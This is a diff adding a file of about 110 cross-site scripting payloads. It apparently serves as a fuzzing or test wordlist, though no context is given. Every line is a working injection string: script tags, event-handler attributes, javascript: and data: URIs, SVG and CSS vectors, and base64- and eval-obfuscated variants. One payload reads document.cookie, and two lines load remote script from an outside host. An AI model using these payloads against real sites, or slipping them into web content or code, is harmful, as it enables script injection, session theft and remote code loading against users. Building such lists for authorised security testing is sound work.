@@ -1,0 +1,110 @@
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(1)</script>
+<script>confirm('XSS')</script>
+<script>prompt('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert("XSS")>
+<img src=x onerror=alert(1)>
+<svg onload=alert('XSS')>
+<svg onload=alert("XSS")>
+<svg onload=alert(1)>
+<iframe src=javascript:alert('XSS')>
+<iframe src=javascript:alert("XSS")>
+<iframe src=javascript:alert(1)>
+<body onload=alert('XSS')>
+<body onload=alert("XSS")>
+<input onfocus=alert('XSS') autofocus>
+<input onfocus=alert("XSS") autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+<video><source onerror="alert('XSS')">
+<audio src=x onerror=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
+javascript:alert('XSS')
+javascript:alert("XSS")
+javascript:alert(1)
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+</script><script>alert('XSS')</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=1 href=1 onerror="javascript:alert('XSS')">
+<img src=1 onerror="alert('XSS')">
+<script>alert(/XSS/)</script>
+<script>alert(document.cookie)</script>
+<script>alert(window.location)</script>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+<img src="x:gif" onerror="alert('XSS')">
+<iframe src="data:text/html,<script>alert('XSS')</script>">
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
+<form><button formaction=javascript:alert('XSS')>Click
+<form><input formaction=javascript:alert('XSS') type=submit>
+<form><input formaction=javascript:alert('XSS') type=image>
+<form><input formaction=javascript:alert('XSS') type=submit value=Click>
+<math><mi//xlink:href="data:x,<script>alert('XSS')</script>">
+<svg><script>alert('XSS')</script></svg>
+<svg><script xlink:href="data:,alert('XSS')"></script></svg>
+<svg><use xlink:href="data:,<script>alert('XSS')</script>"></svg>
+<svg><foreignobject><script>alert('XSS')</script></foreignobject></svg>
+<svg><title><script>alert('XSS')</script></title></svg>
+<svg><desc><script>alert('XSS')</script></desc></svg>
+<svg><metadata><script>alert('XSS')</script></metadata></svg>
+<svg><g onload="alert('XSS')"></g></svg>
+<svg><animatetransform onbegin=alert('XSS')></svg>
+<svg><animate onbegin=alert('XSS')></svg>
+<svg><animatemotion onbegin=alert('XSS')></svg>
+<svg><animatecolor onbegin=alert('XSS')></svg>
+<svg><image xlink:href="javascript:alert('XSS')"></svg>
+<svg><set attributename=onmouseover to=alert('XSS')></svg>
+<svg width="100" height="100"><circle cx="50" cy="50" r="40" onmouseover="alert('XSS')" /></svg>
+<div onmouseover="alert('XSS')">Hover me</div>
+<div onclick="alert('XSS')">Click me</div>
+<input type="text" onkeydown="alert('XSS')">
+<input type="text" onkeyup="alert('XSS')">
+<input type="text" onchange="alert('XSS')">
+<select onchange="alert('XSS')"><option>test</option></select>
+<textarea onkeyup="alert('XSS')"></textarea>
+<button onclick="alert('XSS')">Click</button>
+<a href="javascript:alert('XSS')">Click</a>
+<link rel=stylesheet href="javascript:alert('XSS')">
+<style>@import'javascript:alert("XSS")';</style>
+<style>body{background:url("javascript:alert('XSS')")}</style>
+<style>li{list-style:url("javascript:alert('XSS')")}</style>
+<meta http-equiv="refresh" content="0;javascript:alert('XSS')">
+<base href="javascript:alert('XSS');">
+<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>
+<script>Function('alert("XSS")')();</script>
+<script>setTimeout('alert("XSS")',100)</script>
+<script>setInterval('alert("XSS")',1000)</script>
+<script>(function(){alert('XSS')})();</script>
+<script>location='javascript:alert("XSS")'</script>
+<script>location.href='javascript:alert("XSS")'</script>
+<script>window.location='javascript:alert("XSS")'</script>
+<script>document.location='javascript:alert("XSS")'</script>
+<script>top.location='javascript:alert("XSS")'</script>
+<script>parent.location='javascript:alert("XSS")'</script>
+<script>self.location='javascript:alert("XSS")'</script>
+<script>this.location='javascript:alert("XSS")'</script>
+<script>window.open('javascript:alert("XSS")')</script>
+<script>document.write('<script>alert("XSS")<\/script>')</script>
+<script>document.writeln('<script>alert("XSS")<\/script>')</script>
+<script>innerHTML='<script>alert("XSS")<\/script>'</script>
+<script>outerHTML='<script>alert("XSS")<\/script>'</script>
+<script>document.body.innerHTML='<script>alert("XSS")<\/script>'</script>
+<script src=data:,alert('XSS')></script>
+<script src=data:text/javascript,alert('XSS')></script>
+<script src=//brutelogic.com.br/1.js></script>
+<link rel=import href=//brutelogic.com.br/1.js>
+<script>import('data:text/javascript,alert("XSS")')</script>
+<xss id=x tabindex=1 onactivate=alert('XSS')></xss>
+<xss onclick="alert('XSS')">test</xss>
+<xss onmouseover="alert('XSS')">test</xss>
+<xss style="behavior:url(#default#time2)" onbegin="alert('XSS')">
+<<SCRIPT>alert('XSS');//<</SCRIPT>
+<script>alert('XSS');</script>
+<script>alert`XSS`</script>
+<script>(alert)`XSS`</script>
+<script>eval`alert\`XSS\``</script>
